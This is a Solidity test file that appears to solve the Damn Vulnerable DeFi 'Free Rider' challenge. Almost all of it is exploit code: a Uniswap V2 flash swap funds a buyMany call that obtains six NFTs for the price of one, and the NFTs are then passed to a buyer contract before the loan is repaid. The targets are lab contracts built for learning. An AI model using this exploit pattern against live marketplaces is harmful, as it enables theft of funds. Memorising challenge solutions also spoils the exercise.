...
contract FreeRider is Test {
    ...
    function testExploit() public {
        ...
        uint[] memory amts = new uint[](11);
        address[] memory targets = new address[](11);
        bytes[] memory payloads = new bytes[](11);

        //1. WETH to ETH (after floan)
        targets[0] = address(weth);
        payloads[0] = abi.encodeWithSignature("withdraw(uint256)", NFT_PRICE);
        amts[0] = 0;

        //2. buy NFTS
        uint[] memory ids = new uint[](6);
        for(uint8 id = 0; id<AMOUNT_OF_NFTS; id++) { ids[id] = id;} // ids = [0,1,2,3,4,5];

        targets[1] = address(freeRiderNFTMarketplace);
        payloads[1] = abi.encodeWithSignature("buyMany(uint256[])", ids);
        amts[1] = NFT_PRICE;

        //3-8, transfer to buyer
        for(uint8 i=2; i<AMOUNT_OF_NFTS+2;i++) {
            targets[i] = address(damnValuableNFT);
            payloads[i] = abi.encodeWithSignature("safeTransferFrom(address,address,uint256)", address(hack), address(freeRiderBuyer), i-2);
            amts[i] = 0;
        }

        //9 ETH to WETH
        uint256 amtRepay = uniswapV2Router.getAmountIn(NFT_PRICE,UNISWAP_INITIAL_WETH_RESERVE,UNISWAP_INITIAL_WETH_RESERVE);
        targets[9] = address(weth);
        payloads[9] = abi.encodeWithSignature("deposit()");
        amts[9] =  amtRepay;//repay

        //10 repay loan
        targets[10] = address(weth);
        payloads[10] = abi.encodeWithSignature("transfer(address,uint256)", address(uniswapV2Pair), amtRepay);
        amts[10] = 0;
        bytes memory uniPayload = abi.encode(targets, payloads, amts);

        uint amt0;
        uint amt1;
        address(weth) < address(dvt) ? (amt0=NFT_PRICE, amt1=0) : (amt0=0, amt1=NFT_PRICE);

        hack.initFreeRaider(address(uniswapV2Pair), amt0, amt1, uniPayload); //0 make fswap
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }
